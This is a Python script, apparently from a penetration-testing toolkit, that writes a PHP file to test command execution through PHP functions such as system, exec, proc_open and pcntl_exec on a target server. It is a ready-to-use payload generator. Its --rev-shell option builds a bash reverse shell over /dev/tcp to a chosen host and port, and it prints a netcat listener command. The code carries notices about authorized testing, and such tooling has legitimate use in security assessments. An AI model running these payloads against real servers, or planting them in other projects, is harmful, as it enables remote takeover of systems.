#!/usr/bin/python3
import argparse

# How to invoke each supported function with the generated script's $command
# variable, and how to print its output.
SUPPORTED_FUNCTIONS = {
    "system": "system($command);",
    "exec": (
        "exec($command, $output);\n"
        "echo implode(\"\\n\", $output) . \"\\n\";"
    ),
    "shell_exec": "echo shell_exec($command);",
    "passthru": "passthru($command);",
    "popen": (
        "$fp = popen($command, \"r\");\n"
        "if ($fp) {\n"
        "    while (!feof($fp)) {\n"
        "        echo fread($fp, 4096);\n"
        "    }\n"
        "    pclose($fp);\n"
        "}"
    ),
    "proc_open": (
        "$descriptorspec = array(1 => array(\"pipe\", \"w\"), 2 => array(\"pipe\", \"w\"));\n"
        "$proc = proc_open($command, $descriptorspec, $pipes);\n"
        "if (is_resource($proc)) {\n"
        "    echo stream_get_contents($pipes[1]);\n"
        "    fclose($pipes[1]);\n"
        "    fclose($pipes[2]);\n"
        "    proc_close($proc);\n"
        "}"
    ),
    # pcntl_exec replaces the current process image rather than returning output,
    # so run the command through /bin/sh -c like the others, instead of taking a
    # binary path + argv directly.
    "pcntl_exec": "pcntl_exec('/bin/sh', ['-c', $command]);",
}

parser = argparse.ArgumentParser(
    prog="execution-checker.py",
    formatter_class=argparse.RawDescriptionHelpFormatter,
    description=(
        "Generates a small, self-contained PHP script that runs one command through\n"
        "one specific PHP function you've already confirmed is enabled (e.g. via\n"
        "dfunc-audit.py --gen-checker --enabled-only), to confirm that command\n"
        "execution actually works through it on a server you are authorized to test."
    ),
    epilog=(
        "examples:\n"
        "  Confirm system() executes commands (uses the default 'id' test):\n"
        "    execution-checker.py --function system --output check.php\n\n"
        "  Try a different enabled function and command:\n"
        "    execution-checker.py --function shell_exec --command whoami --output check.php\n\n"
        "  Generate a reverse shell payload through proc_open:\n"
        "    execution-checker.py --function proc_open --rev-shell --host 10.10.10.10 --port 4444 --output check.php\n\n"
        "  Then on the server:\n"
        "    php check.php\n"
    ),
)
parser.add_argument("--function", required=True, metavar="NAME", choices=sorted(SUPPORTED_FUNCTIONS),
                     help="The dangerous function you've confirmed is enabled, one of: "
                          + ", ".join(sorted(SUPPORTED_FUNCTIONS)) + ".")
parser.add_argument("--command", metavar="CMD", default="id",
                     help="The shell command to run through that function. Defaults to "
                          "'id', a harmless default test case. Ignored if --rev-shell "
                          "is given.")
parser.add_argument("--rev-shell", action="store_true", dest="rev_shell",
                     help="Generate a reverse shell payload (bash -i >& /dev/tcp/HOST/PORT "
                          "0>&1) instead of running --command. Requires --host and --port.")
parser.add_argument("--host", metavar="HOST",
                     help="Listener host/IP to connect back to. Required with --rev-shell.")
parser.add_argument("--port", metavar="PORT", type=int,
                     help="Listener port to connect back to. Required with --rev-shell.")
parser.add_argument("--output", required=True, metavar="OUTPUT_FILE",
                     help="Where to write the generated PHP script.")
args = parser.parse_args()

if args.rev_shell:
    if not args.host or not args.port:
        parser.error("--rev-shell requires --host and --port")
    command = "bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'".format(host=args.host, port=args.port)
else:
    command = args.command


def php_string_literal(s):
    return "'" + s.replace("\\", "\\\\").replace("'", "\\'") + "'"


cmd_php = php_string_literal(command)
call = SUPPORTED_FUNCTIONS[args.function]

script = (
    "<?php\n"
    "// Command-execution checker generated by dfunc-audit.\n"
    "// Confirms that " + args.function + "() can actually run a command on this server.\n"
    "// Only run this on systems you are authorized to test.\n\n"
    "$command = " + cmd_php + ";\n\n"
    + call + "\n"
)

with open(args.output, "w") as fh:
    fh.write(script)

print("\nWrote a " + args.function + "() command-execution check to " + args.output)
print("Run it on the server with: php " + args.output)
if args.rev_shell:
    print("Start a listener first: nc -lvnp " + str(args.port))
